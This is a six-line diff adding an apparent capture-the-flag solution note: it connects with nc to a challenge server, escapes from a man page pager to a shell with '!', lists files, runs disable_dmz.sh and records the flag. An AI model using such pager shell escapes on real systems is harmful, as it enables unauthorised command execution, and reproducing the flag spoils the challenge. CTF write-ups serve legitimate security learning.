@@ -1,0 +1,6 @@
+-nc moar.ctfcompetition.com 1337
+-use ! to execute commands in the man page
+-!ls
+-!ls /home/moar => "disable_dmz.sh"
+-./home/moar/disable_dmz.sh prints the CTF Flag
+-"CTF{SOmething-CATastr0phic}"
